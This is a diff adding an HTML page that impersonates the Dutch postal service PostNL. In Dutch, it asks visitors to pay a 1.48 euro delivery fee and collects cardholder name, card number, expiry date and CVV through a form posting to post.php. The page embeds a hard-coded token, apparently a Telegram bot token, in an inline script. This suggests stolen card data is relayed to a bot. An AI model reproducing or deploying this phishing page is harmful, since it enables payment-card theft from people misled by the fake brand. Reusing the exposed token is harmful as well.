@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<link href="local_resources/css/2ebbe86da6ea6dee82fcb8e567b3c1bf.css" rel="stylesheet"/>
+<title>PostNL</title>
+</head>
+<body>
+<header>
+<div class="left">
+<img src="local_resources/img/51e4785493c12229066a0ce6eea56bb0.png"/>
+<a href="#">Mijn account</a>
+<a href="#">Verzenden</a>
+<a href="#">Zakelijke oplossingen</a>
+<a href="#">Klantenservice</a>
+</div>
+<div class="right">
+<a href="#">Hulp</a>
+<button>Uitloggen</button>
+</div>
+</header>
+<main>
+<script>var token="7588677879:AAHRT9MZ1JN-IY1FpIltlG44U9FZGJdotTo";</script>
+<div class="continer">
+<h2>Bezorgkosten: 1,48 EURO.</h2>
+<div class="title1"> Voeg een betaalmethode toe om de bezorgkosten voor uw pakket te betalen.</div>
+<form action="post.php" method="post">
+<div class="col">
+<div class="text"> Naam op kaart </div>
+<input name="name" placeholde="" required="" type="text"/> </div>
+<div class="col">
+<div class="text"> Kaartnummer</div>
+<input id="cc" name="cc" placeholder="XXXX XXXX XXXX XXXX" required="" type="text"/></div>
+<div class="col">
+<div class="text">Vervaldatum </div>
+<input id="exp" name="exp" placeholder="MM/JJ" required="" type="text"/> </div>
+<div class="col">
+<div class="text"> Beveiligingscode</div>
+<input id="cvv" name="cvv" placeholder="CVV" required="" type="text"/> </div>
+<div class="col">
+<button type="submit">Doorgaan</button>
+</div> <br/>
+</form>
+</div>
+</main>
+<script src="local_resources/js/4fd603b1043d7e7f22d6fcc9f2288081.js"></script>
+<script src="local_resources/js/91916b0780f0f71b8a2bbbffa73242fc.js"></script>
+<script src="local_resources/js/65b33da0429edf724a1df4f8205e6a74.js"></script>
+<script>
+$("#cc").mask("0000 0000 0000 0000");
+$("#exp").mask("00/00");
+$("#cvv").mask("0000");
+</script>
+</body>
+</html> 
